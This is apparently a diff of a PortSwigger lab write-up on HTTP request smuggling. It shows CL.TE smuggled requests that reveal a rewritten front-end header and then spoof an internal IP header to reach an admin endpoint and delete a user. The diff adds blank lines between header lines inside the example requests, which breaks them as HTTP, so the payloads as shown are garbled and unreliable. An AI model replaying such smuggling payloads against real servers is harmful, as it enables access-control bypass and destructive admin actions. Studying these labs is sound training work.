@@ -27,18 +27,30 @@ Phase 1 - Discover the Rewritten Header
 Smuggle a POST request to the search functionality.
 
 POST / HTTP/1.1
+
 Host: LAB-ID.web-security-academy.net
+
 Content-Length: ...
+
 Transfer-Encoding: chunked
+
+
 
 0
 
+
+
 POST / HTTP/1.1
+
 Content-Type: application/x-www-form-urlencoded
+
 Content-Length: 200
+
 Connection: close
 
+
 search=test
+
 Why the Search Function?
 
 The search page reflects the submitted search term.
@@ -59,20 +71,34 @@ Phase 2 - Spoof the Internal IP
 
 Once the header name is known, send another smuggled request.
 
+
 POST / HTTP/1.1
+
 Host: LAB-ID.web-security-academy.net
+
+
 Content-Length: ...
+
 Transfer-Encoding: chunked
 
 0
 
+
+
 GET /admin/delete?username=carlos HTTP/1.1
+
 X-cDfQ0n-Ip: 127.0.0.1
+
 Content-Type: application/x-www-form-urlencoded
+
 Content-Length: 200
+
 Connection: close
 
+
+
 x=1
+
 Why 127.0.0.1?
 
 The admin panel only allows requests originating from:
@@ -117,11 +143,19 @@ HTTP Request Smuggling exposes these hidden modifications.
 If the back-end blindly trusts the injected header, an attacker can forge its value and bypass access controls.
 
 Key Takeaways
+
 Front-end proxies may automatically rewrite HTTP requests.
+
 Hidden headers can be discovered through Request Smuggling.
+
 Applications should never trust client-controlled IP headers without verifying their source.
+
 Trusting rewritten headers can lead to authentication and authorization bypass.
+
 Request rewriting is another real-world impact of HTTP Request Smuggling.
+
 References
+
 PortSwigger Web Security Academy – HTTP Request Smuggling
+
 PortSwigger – Revealing Front-End Request Rewriting
